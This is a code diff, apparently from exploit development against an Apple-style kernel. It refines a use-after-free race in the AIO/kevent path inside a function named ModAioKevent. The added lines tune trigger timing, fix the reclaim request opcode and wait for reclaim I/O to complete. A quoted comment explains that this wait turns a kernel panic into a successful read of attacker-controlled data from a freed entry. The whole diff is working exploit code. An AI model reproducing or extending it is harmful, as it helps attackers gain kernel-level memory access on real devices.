@@ -1516,6 +1516,10 @@ NSString *ModAioKevent(void) {
         if (aio_read(&cb) != 0) { silent++; continue; }
         attempts++;
 
+        // rotating delay 0/10/50/100 ms before the trigger (their STEP 4)
+        static const int delays[4] = {0, 10000, 50000, 100000};
+        usleep(delays[round & 3]);
+
         // racer: free then reclaim, in this same thread (same CPU -> LIFO)
         __block volatile int done = 0;
         __block int issued = 0;
@@ -1530,6 +1534,7 @@ NSString *ModAioKevent(void) {
                             rs_aio_rcb[i].aio_offset = 0;
                             rs_aio_rcb[i].aio_buf = rs_aio_rbuf[i];
                             rs_aio_rcb[i].aio_nbytes = RECL_NB;
+                            rs_aio_rcb[i].aio_lio_opcode = LIO_READ;
                             rs_aio_rcb[i].aio_sigevent.sigev_notify = SIGEV_NONE;
                             if (aio_read(&rs_aio_rcb[i]) == 0) issued++;
                         }
@@ -1542,6 +1547,22 @@ NSString *ModAioKevent(void) {
         });
         // wait for the racer to finish the free+reclaim
         for (int spin = 0; spin < 100000 && !done; spin++) usleep(50);
+
+        // *** THE MISSING STEP ***
+        // "The reclaim requests being ISSUED is not the same as the allocation
+        //  having HAPPENED... Waiting for the reclaim I/O to actually complete
+        //  means the slot is occupied by our entry, so the filter copies our
+        //  bytes out instead of panicking. This is the difference between a
+        //  panic and a HIT."
+        int rc_done = 0;
+        for (int w = 0; w < 400000; w++) {
+            rc_done = 1;
+            for (int i = 0; i < NRECLAIM; i++) {
+                if (aio_error(&rs_aio_rcb[i]) == EINPROGRESS) { rc_done = 0; break; }
+            }
+            if (rc_done) break;
+        }
+        AveLog(S(@"[aio20637b12] round=%d reclaim_complete=%d issued=%d", round, rc_done, issued));
         usleep(2000);
 
         // B2: read the kevent that filt_aioprocess fills from the stale entry
